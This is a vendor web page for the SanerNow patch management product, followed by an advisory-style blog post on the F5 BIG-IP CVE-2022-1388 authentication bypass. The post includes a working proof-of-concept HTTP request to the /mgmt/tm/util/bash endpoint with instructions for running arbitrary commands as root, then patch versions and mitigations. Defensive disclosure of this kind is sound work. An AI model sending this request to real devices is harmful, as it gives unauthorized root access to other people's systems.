### Take Patch Management Miles Ahead with the Industry Leading Patching Capabilities

 Automate Patching for Faster Deployment

Manual patching cycles are tedious and time-consuming. With the SanerNow automated patch management tool, configure end-to-end workflows for automatic patching and fix risks faster than ever. Schedule automated patching tasks and make patching a hands-free task. It also supports the upload of pre and post-remediation scripts.

 Test and Approve Patches for Zero-Disruption

Applying new patches directly to the production environment is risky. SanerNow patch management software enables you to create a test environment to test the new patches to verify compatibility. Later, deploy the approved patches across the devices in your production environment and prevent any disruptions and productivity errors.

 Perimeter-Less Patching with a Single, light-weight Agent

SanerNow auto patching software is an ideal solution for hybrid workforces. You can easily deploy patches across globally distributed devices from a centralized cloud patch management solution. Furthermore, all the patching tasks, from scanning to deployment, are executed by a single lightweight multifunctional agent installed in the endpoints. You can also go for the agent-less option, which is a unique approach to scanning while retaining the scan speed and accuracy.

 Risk based Prioritization to Deploy Patches Smartly

SanerNow auto patching tool thoroughly assesses the patches and prioritizes them based on their business context, technical impact, severity level, and more intelligence to help focus on critical patches immediately. Additionally, you can deploy these patches quickly to reduce risk exposure and plan your remediation efforts wisely.

 Firmware Patches for Complete Risk Mitigation

As important as the software application patches, firmware patches are critical to tightening IT security. Moreover, it is recommended to include firmware patching as you establish your automated patch management cadence to reduce security risk exposure. SanerNow patch manager supports patching for firmware updates to fix issues and errors in firmware.

 Continuous and Customizable Patch Scans to Identify Missing Patches

Move away from the periodic scans and make it a continuous process with SanerNow patch management software. Keep your patching up-to-date with customized, real-time, and continuous scans for verified patches based on your IT environment. You can additionally perform real-time, on-demand, scheduled, and automated patch scans with the SanerNow patch management tool.

 Cross-Platform Patching with Support for Third-Party Apps

SanerNow patch management tool supports multi-platform patching for all major operating systems like Windows, macOS, Linux, and 550+ third-party applications. SanerNow’s automated patching solution additionally maintains a pre-built patch repository for third-party application patches.

 Effortless Patch Rollback for an Error-Prone Patching

Patch rollback is made easier with the SanerNow automated patch management tool to avoid disruptions in business operations. It rollbacks the last stable version with zero downtime and a single click to easily deal with incompatible and error-prone software patches.

 Comply with Industry Benchmarks and Security Standards

Various industry regulatory standards and organizations mandate patch compliance. SanerNow auto patch management software provides a unified view of your software patch compliance to address deviations from compliance standards and deploy patches accordingly. However, with auto patching in SanerNow, you can quickly fix the misconfigurations and achieve compliance with regulatory standards.

 Insights and Tracking with Reports and Audit Logs

Track detailed insights on your patching metrics with auto-generated reports and an inbuilt audit log. SanerNow automated patch management software provides a wide range of reports to assess the patching status in your network. Additionally, SanerNow provides an insightful Patch Impact Report to analyze the impact of patches and track the patching activities.

![](https://www.secpod.com/wp-content/uploads/2024/06/Asset-12@4x-8-1024x954-3.webp)

*“SanerNow’s patch management capabilities stand out from the competition since it can patch all the discovered vulnerabilities and perform other system-hardening actions. Even if no direct remediation is available, SanerNow applies security controls that provide workarounds for the* *vulnerabilities.”*

**– Swetha Krishnamoorthi, Senior Industry Analyst, Cybersecurity, Frost & Sullivan**

# F5 BIG-IP Critical Remote Code Execution Vulnerability Getting Exploited. Patch Now!

* Post author:[Tanish Mahajan](https://www.secpod.com/blog/author/tanish-m/ "Posts by Tanish Mahajan")

A **Remote Code Execution** vulnerability was detected (**CVE-**[**2022-1388**](https://nvd.nist.gov/vuln/detail/CVE-2022-1388)) in **F5 BIG-IP.** This flaw affects the BIG-IP **iControl REST** authentication component. Successful exploitation allows remote attackers to **bypass authentication and execute commands** on the vulnerable device with the highest privileges. Various action environments commonly use F5 BIG-IP devices, making this flaw (CVE-2022-1388) critical. This flaw can also affect other devices after gaining initial access to the corporate networks, so it’s important to check for vulnerabilities using a [vulnerability management tool](https://www.secpod.com/vulnerability-management/).

A recently published exploit for the F5 BIG-IP Vulnerability of 2022 (CVE-2022-1388) can lead to RCE. Cybersecurity researchers from Horizon3 and Positive Technologies have created the exploit. They also warned all admins to patch their devices ASAP to prevent cyber attacks. Remote attackers who have control after exploitation can employ various types of attacks to deploy malware or seal corporate data. Exposing the management side of the device to the Internet is not recommended as it is the only part affected by this flaw (CVE-2022-1388). However, the exposure of 2,500 devices to the Internet remains a substantial risk to the enterprise. [Patch management software](https://www.secpod.com/patch-management/) can resolve these issues.

## Exploitation Steps for F5 BIG-IP Vulnerability of 2022

The Exploit seems to be easy as we just need to send a post request to a specific endpoint with post data and can execute random commands on the vulnerable device.

Here’s the **POC**:

> POST HTTP/1.1
>
> Host: REDACTED:8083
>
> Content-Length: 45
>
> Connection: Keep-Alive, X-F5-Auth-Token
>
> Cache-Control: max-age=0
>
> X-F5-Auth-Token: vvs
>
> Authorization: Basic YWRtaW46
>
> {
>
> “command”:”run”,
>
> “utilCmdArgs”:”-c id”
>
> }

* Make a Post request to “**/mgmt/tm/util/bash**” endpoint with all the mandatory headers.
* Add post data and in “**utilCmdArgs**” put the command after “-c” which needs to execute.

We have copied the vulnerability in F5’s BIG-IP and are executing the “id” command shown below:

[![F5-BIG-IP-Vulnerability-of-2022-commands](https://www.secpod.com/blog/wp-content/uploads/2022/05/Capture-1.png)](https://www.secpod.com/blog/wp-content/uploads/2022/05/Capture-1.png)

As you can see, we are getting the output of the “id” command i.e “uid=0(root) gid=0(root) groups=0(root)” and we can successfully exploit the target. Executing commands with root privileges is possible since the response includes.”uid=0″ (indicating superuser).

## Solution for F5 BIG-IP Vulnerability of 2022

F5 BIG-IP has already [released BIG-IP security updates](https://support.f5.com/csp/article/K23605346) that need to be applied for firmware versions

* For BIG-IP versions 16.x, a fix is available in version 16.1.2.2
* For BIG-IP versions 15.x, a fix is available in version 15.1.5.1
* For BIG-IP versions 14.x, a fix is available in version 14.1.4.6
* For BIG-IP versions 13.x, a fix is available in version 13.1.5

> Note: BIG-IP versions 11.x and 12.x will not receive any security updates and should be upgraded to newer version.

## Mitigation

For admins who cannot upgrade their BIG-IP devices immediately, three mitigations have also been released.

* ### Block iControl REST access through the self IP address

According to the advisory, “You can block all access to the iControl REST interface of your BIG-IP system through self IP addresses. To do so, you can change the **Port Lockdown** ‘settings’ to **Allow None** for each self IP address in the system. If you must open any ports, you should use the **Allow Custom** option to disallow access to iControl REST. By default, iControl REST listens on TCP port 443 or TCP port 8443 on single NIC BIG-IP VE instances. Finally, if you modified the default port, ensure that you disallow access to the alternate port you configured.”

* ### Block iControl REST access through the management interface

According to the advisory, “To mitigate this vulnerability for affected F5 products, you should restrict management access only to trusted users and devices over a secure network. For more information about securing access to BIG-IP systems, refer to the following articles:”

* ### **Modify the BIG-IP httpd configuration**

According to the advisory, “In addition to blocking access through the self IP addresses and management interface, or as an alternative to blocking access if those options are not possible in your environment, you can modify the BIG-IP httpd configuration to mitigate this issue.”

**[SanerNow Advanced Vulnerability Management](https://www.secpod.com/vulnerability-management/)** detects this vulnerability; we strongly recommend applying the security update as soon as possible.
